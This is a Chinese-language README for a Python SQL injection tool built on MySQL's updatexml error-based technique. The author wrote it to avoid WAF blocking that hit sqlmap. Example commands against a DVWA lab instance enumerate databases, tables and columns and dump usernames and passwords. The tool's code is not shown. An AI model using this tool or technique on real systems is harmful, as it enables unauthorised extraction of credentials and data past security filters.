# updatexml
updataxml注入小工具

在某项目中遇到了需要通过updataxml注入获取大量数据的需求，但是由于服务器上有waf，sqlmap很容易就被封了，而且只能指定注入类型使用报错注入，但是不能指定注入语句，感觉sqlmap发送的很多语句都不是必须的，所以自己写了这个工具，简单粗暴的指定了几个uodatexml直接注入获取数据库，数据表等的指定语句，去除了多余的探测。

#### 使用要求
- python3.x

#### 使用方法
- 总体操作方法和sqlmap一样
- data结果会自动输出到以hostname命令的文件夹里面
1. 参数
```
usage: updatexml_sql.py [-h] [-u URL] [-r FILE] [-p PARAMETER] [-s PROTOCOL]
                        [-cookie COOKIE] [--current] [--tables] [--columns]
                        [-D DATABASE] [-T TABLE] [-C COLUMN]

SQL Updatexml

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Start scanning url with GET method
  -r FILE, --file FILE  Start scanning url with POST method, Request body
  -p PARAMETER, --parameter PARAMETER
                        Which parameter can be injected
  -s PROTOCOL, --protocol PROTOCOL
                        If you use -r, should add http or https
  -cookie COOKIE, --cookie COOKIE
                        cookie
  --current             Get database
  --tables              Get tables
  --columns             Get columns
  -D DATABASE, --database DATABASE
                        Which Database need get data
  -T TABLE, --table TABLE
                        Which Table need get data
  -C COLUMN, --column COLUMN
                        Which columns need get data
```
**注意事项（重要！！）：** 
- 如果是字符型注入请自己在URL或者post包里面的注入参数的地方加上单引号或者双引号！

2. Get方式的直接输入url和指定注入的参数（必须）
```
python3 updatexml_sql.py -u http://192.168.76.154/dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit -p id --current  //--current是获取当前数据库,-p指定存在注入的参数，且如果是字符型注入，在注入参数的地方自己加上单引号或者双引号

python3 updatexml_sql.py -u http://192.168.76.154/dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit -p id -D dvwa --tables //获取数据表

python3 updatexml_sql.py -u http://192.168.76.154/dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit -p id -D dvwa -T user --columns  //获取字段

python3 updatexml_sql.py -u http://192.168.76.154/dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit -p id -D dvwa -T user -C user_id,username,password //获取指定字段的值

python3 updatexml_sql.py -u http://192.168.76.154/dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit -p id --current -cookie 'security=impossible; PHPSESSID=6c7qeijtq9ht3h1t54m0p60p20' //-cookie 指定cookie
```
3.POST请求使用读取请求头文件的方式
```
python3 -r header.txt -s https -p id --current  // 注意使用-s参数指定是http还是https
```
